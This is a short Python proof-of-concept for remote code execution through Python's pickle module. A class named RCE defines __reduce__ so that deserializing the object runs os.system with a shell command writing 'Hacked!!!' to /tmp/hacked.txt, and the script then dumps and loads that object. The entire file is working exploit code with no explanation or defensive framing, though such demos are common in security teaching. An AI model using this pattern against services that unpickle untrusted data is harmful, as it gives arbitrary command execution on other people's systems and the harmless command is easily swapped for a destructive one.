import pickle
import os

class RCE:
    def __reduce__(self):
        return (os.system, ('echo "Hacked!!!" > /tmp/hacked.txt',))

pickled = pickle.dumps(RCE())
unpickled = pickle.loads(pickled)
